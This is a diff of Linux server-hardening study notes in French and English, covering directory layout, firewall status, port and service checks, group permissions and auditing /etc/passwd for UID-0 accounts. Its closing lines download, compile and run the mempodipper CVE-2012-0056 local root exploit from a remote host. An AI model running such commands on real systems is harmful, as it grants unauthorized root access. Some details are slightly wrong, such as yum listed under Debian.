@@ -2,6 +2,25 @@
 
 - ![linux-file-system](assets/slides/computer_science/assets/linux-file-system.jpg)
 
+|Folder||
+|---|---|
+|/bin | Les fichiers binaires, les 'exécutables'. Les commandes utilisable via la terminal.|
+|/boot | Contient tout ce qui est nécéssaire au démarrage du système (noyau, kernel), on retrouve souvent le logiciel Grub ou Lilo|
+|/dev | Ensemble de répertoires et de fichiers système décrivant les périphériques pour leur permettre de communiquer avec le système|
+|/etc | Ce répertoire contient les fichiers de configuration des différents logiciels installés|
+|/home | C'est le répertoire des données personnels et contient les fichiers de configuration de chaque compte utilisateurs|
+|/lib | Contient la librairies des programmes du système et des programmes|
+|/lost-found | Résulat des scandisk. (n'existe pas sur tout les types de partitions)|
+|/mnt | C'est l'emplacement où ce fait le montage des périphériques temporairement, clé usb, cd, dvd, disque dur externe..|
+|/opt | Répertoire optionnel pour l'installation de logiciels, add-on..|
+|/proc | Contient des informations sur le système de fichiers du noyau. (pid)|
+|/root | Dossiers personnels du super utilisateur (root)|
+|/sbin | Le /bin/ du super utilisateur (root)|
+|/usr | Des fichiers systèmes destinés à l'utilisateur|
+|/var | Contient toutes les données variables du système|
+
+
+
 ## logs
 
 /var/log
@@ -65,18 +84,83 @@ Check and Configure the Firewall
     root@server:~# ufw app list Available applications: OpenSSH
     root@server:~# ufw status Status: active To Action From -- ------ ---- 22/tcp ALLOW Anywhere 22 ALLOW Anywhere 8080/tcp ALLOW Anywhere 80/tcp ALLOW Anywhere Anywhere DENY 58.218.92.34 80 DENY 202.54.1.5 22 (v6) ALLOW Anywhere (v6) 22/tcp (v6) ALLOW Anywhere (v6) 8080/tcp (v6) ALLOW Anywhere (v6) 80/tcp (v6) ALLOW Anywhere (v6)
 
-Limit Open Ports
-    Testing for open ports can be accomplished using the command netstat -tulpn:
-    root@server:~# /home# netstat -tulpn Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address           Foreign Address State PID/Program name tcp        0 0 0.0.0.0:22              0.0.0.0:* LISTEN   69941/sshd tcp6       0 0 :::22                   :::* LISTEN   69941/ss
+Scanning open ports
+    A port is open when a process running on the host is listening on that port for requests. 
+    Regular web server probably use HTTP (port 80) and SSH (port 22)
+    root@server:~# netstat -npl
+    root@server:~# netstat -tulpn Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address           Foreign Address State PID/Program name tcp        0 0 0.0.0.0:22              0.0.0.0:* LISTEN   69941/sshd tcp6       0 0 :::22                   :::* LISTEN   69941/ss
+
+    ss has begun to replace netstat
+    $ ss -o state established ‘( dport = :ssh or sport = :ssh )’
 
 Turn Off IPv6
     If you are not using IPv6, you can go to the network configuration file and add the following lines to disable it.
     vim /etc/sysconfig/network
     NETWORKING_IPV6=no IPV6INIT=no
 
+Scanning for active services
+    systemctl list-unit-files — type=service — state=enabled
+    systemctl stop haveged
+    systemctl disable haveged
+
+Isolating processes within containers
+
+System groups
+    groups can be “assigned” to files or directories, allowing any group members to share the group powers
+
+    nano datafile.txt
+    chmod 770 datafile.txt  owner/group have full rights over the file, but others nothing, even read it.
+
+    Add an extra user
+    $ useradd otheruser
+    $ passwd otheruser
+    $ su otheruser
+      Password:
+    $ cat /home/ubuntu/datafile.txt
+    cat: /home/ubuntu/datafile.txt: Permission denied
+    $ exit
+
+    groupadd app-data-group                     Create a new group 
+    chown ubuntu:app-data-group datafile.txt    Change the group of the file
+    $ ls -l | grep datafile.txt
+    -rwxrwx — — 1 ubuntu app-data-group 6 Aug 9 22:43 datafile.txt
+    # usermod -aG app-data-group otheruser       Add the new user to app-data-group 
+    $ su otheruser                               su to switch between user accounts
+    $ cat datafile.txt
+    
+    $ cat /etc/group                            Have a look
+
+Scanning for dangerous User ID values
+    Using sudo any admin user will be able to temporarily assume root authority
+    Spot imposters
+        Their user and/or group ID numbers will (like root) be zero (0)
+        $ cat /etc/passwd  (has record on regular and system user account)
+        account name, password, user ID, group ID
+        $ awk -F: ‘($3 == "0") {print}’ /etc/passwd    Show lines with 3rd field = 0
+
+Auditing system resources
+
 Be Aware/Cautious of All Applications You Install
-Check and Disable Unneeded Startup Processes
-Review Logs Regularly
+    Check and Disable Unneeded Startup Processes
+    Review Logs Regularly
+
+Searching for installed software
+    Debian
+    yum list installed
+    yum remove packageName
+
+    Ubuntu:
+    dpkg --list
+    apt-get remove packageName
+
+- https://www.liquidweb.com/kb/security-for-your-linux-server/
+- https://www.freecodecamp.org/news/securing-your-linux-web-server/
+
+# Add user
+$ su toto
+$ cd /home/toto
+$ wget http://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c
+$ gcc mempodipper.c -o mempodipper
+$ ./mempodipper
 
 
-https://www.liquidweb.com/kb/security-for-your-linux-server/
